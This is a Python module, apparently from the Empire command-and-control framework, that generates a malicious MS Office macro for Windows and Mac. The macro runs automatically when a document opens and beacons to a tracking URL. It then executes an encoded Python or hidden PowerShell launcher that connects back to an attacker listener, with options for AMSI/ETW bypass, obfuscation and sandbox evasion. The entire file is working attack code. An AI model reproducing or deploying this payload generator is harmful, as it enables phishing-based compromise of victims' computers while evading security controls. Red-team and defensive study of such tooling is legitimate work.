from __future__ import print_function
from builtins import str
from builtins import range
from builtins import object
from empire.server.common import helpers
import re


class Stager(object):

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Macro',

            'Author': ['@enigma0x3', '@harmj0y', '@DisK0nn3cT', '@malcomvetter'],

            'Description': 'Generates a Win/Mac cross platform MS Office macro for Empire, compatible with Office 97-2016 including Mac 2011 and 2016 (sandboxed).',

            'Comments': [
                'http://enigma0x3.wordpress.com/2014/01/11/using-a-powershell-payload-in-a-client-side-attack/',
                'http://stackoverflow.com/questions/6136798/vba-shell-function-in-office-2011-for-mac'
            ]
        }

        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Listener': {
                'Description': 'Listener to generate stager for.',
                'Required': True,
                'Value': ''
            },
            # Don't think the language matters except the framework requires it:
            'Language': {
                'Description': 'Language of the stager to generate.',
                'Required': True,
                'Value': 'powershell',
                'SuggestedValues': ['powershell', 'python'],
                'Strict': True
            },
            'StagerRetries': {
                'Description': 'Times for the stager to retry connecting.',
                'Required': False,
                'Value': '0'
            },
            'OutFile': {
                'Description': 'Filename that should be used for the generated output.',
                'Required': False,
                'Value': ''
            },
            'SafeChecks': {
                'Description': 'Switch. Checks for LittleSnitch or a SandBox, exit the staging process if true. Defaults to True.',
                'Required': True,
                'Value': 'True',
                'SuggestedValues': ['True', 'False'],
                'Strict': True
            },
            'PixelTrackURL': {
                'Description': 'URL to add in pixel tracking which OS attempted macro opening, useful for shell debugging and confirmation.',
                'Required': False,
                'Value': 'http://127.0.0.1/tracking?source='
            },
            'UserAgent': {
                'Description': 'User-agent string to use for the staging request (default, none, or other).',
                'Required': False,
                'Value': 'default'
            },
            'Proxy': {
                'Description': 'Proxy to use for request (default, none, or other).',
                'Required': False,
                'Value': 'default'
            },
            'ProxyCreds': {
                'Description': 'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                'Required': False,
                'Value': 'default'
            },
            'Obfuscate': {
                'Description': 'Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.',
                'Required': False,
                'Value': 'False',
                'SuggestedValues': ['True', 'False'],
                'Strict': True
            },
            'ObfuscateCommand': {
                'Description': 'The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only.',
                'Required': False,
                'Value': r'Token\All\1'
            },
            'Bypasses': {
                'Description': 'Bypasses as a space separated list to be prepended to the launcher',
                'Required': False,
                'Value': 'mattifestation etw'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value

    def generate(self):
        def formStr(varstr, instr):
            holder = []
            str1 = ''
            str2 = ''
            str1 = varstr + ' = "' + instr[:54] + '"'
            for i in range(54, len(instr), 48):
                holder.append('\t\t' + varstr + ' = ' + varstr + ' + "' + instr[i:i + 48])
                str2 = '"\r\n'.join(holder)
            str2 = str2 + "\""
            str1 = str1 + "\r\n" + str2
            return str1

        # extract all of our options
        language = self.options['Language']['Value']
        listener_name = self.options['Listener']['Value']
        obfuscate = self.options['Obfuscate']['Value']
        obfuscate_command = self.options['ObfuscateCommand']['Value']
        user_agent = self.options['UserAgent']['Value']
        proxy = self.options['Proxy']['Value']
        proxy_creds = self.options['ProxyCreds']['Value']
        stager_retries = self.options['StagerRetries']['Value']
        safe_checks = self.options['SafeChecks']['Value']
        pixel_track_url = self.options['PixelTrackURL']['Value']
        bypasses = self.options['Bypasses']['Value']

        invoke_obfuscation = False
        if obfuscate.lower() == "true":
            invoke_obfuscation = True

        # generate the python launcher code
        pylauncher = self.mainMenu.stagers.generate_launcher(listener_name, language="python", encode=True,
                                                             userAgent=user_agent, safeChecks=safe_checks)

        if pylauncher == "":
            print(helpers.color("[!] Error in python launcher command generation."))
            return ""

        # render python launcher into python payload
        pylauncher = pylauncher.replace("\"", "\"\"")
        for match in re.findall(r"'(.*?)'", pylauncher, re.DOTALL):
            pypayload = formStr("str", match)

        # generate the powershell launcher code
        poshlauncher = self.mainMenu.stagers.generate_launcher(listener_name, language=language, encode=True,
                                                               obfuscate=invoke_obfuscation,
                                                               obfuscationCommand=obfuscate_command,
                                                               userAgent=user_agent, proxy=proxy,
                                                               proxyCreds=proxy_creds,
                                                               stagerRetries=stager_retries, safeChecks=safe_checks,
                                                               bypasses=bypasses)

        if poshlauncher == "":
            print(helpers.color("[!] Error in powershell launcher command generation."))
            return ""

        # render powershell launcher into powershell payload
        poshchunks = list(helpers.chunks(poshlauncher, 50))
        poshpayload = "Dim Str As String"
        poshpayload += "\n\t\tstr = \"" + str(poshchunks[0])

        for poshchunk in poshchunks[1:]:
            poshpayload += "\n\t\tstr = str + \"" + str(poshchunk)

        # if statements below are for loading Mac dylibs for compatibility
        macro = """#If Mac Then
    #If VBA7 Then
        Private Declare PtrSafe Function system Lib "libc.dylib" (ByVal command As String) As Long
    #Else
        Private Declare Function system Lib "libc.dylib" (ByVal command As String) As Long
    #End If
#End If

Sub AutoOpen()
    'MsgBox("AutoOpen()")
    Debugging
End Sub

Sub Auto_Open()
    'MsgBox("Auto_Open()")
    Debugging
End Sub

Sub Document_Open()
    'MsgBox("Document_Open()")
    Debugging
End Sub

Public Function Debugging() As Variant
    On Error Resume Next
            Dim tracking As String
            tracking = "%s"
            #If Mac Then
                'Mac Rendering
                If Val(Application.Version) < 15 Then 'Mac Office 2011
                    system ("curl " & tracking & "Mac2011")
                Else 'Mac Office 2016
                    system ("curl " & tracking & "Mac2016")
                End If
                Dim result As Long
                Dim str As String
                %s
                'MsgBox("echo ""import sys,base64;exec(base64.b64decode(\\\"\" \" & str & \" \\\"\"));"" | python3 &")
                result = system("echo ""import sys,base64;exec(base64.b64decode(\\\"\" \" & str & \" \\\"\"));"" | python3 &")
            #Else
                'Windows Rendering
                Dim objWeb As Object
                Set objWeb = CreateObject("Microsoft.XMLHTTP")
                objWeb.Open "GET", tracking & "Windows", False
                objWeb.send
                %s
                'MsgBox(str)
                Set objWMIService = GetObject("winmgmts:\\\\.\\root\cimv2")
                Set objStartup = objWMIService.Get("Win32_ProcessStartup")
                Set objConfig = objStartup.SpawnInstance_
                objConfig.ShowWindow = 0
                Set objProcess = GetObject("winmgmts:\\\\.\\root\cimv2:Win32_Process")
                objProcess.Create str, Null, objConfig, intProcessID
            #End If
End Function""" % (pixel_track_url, pypayload, poshpayload)

        return macro
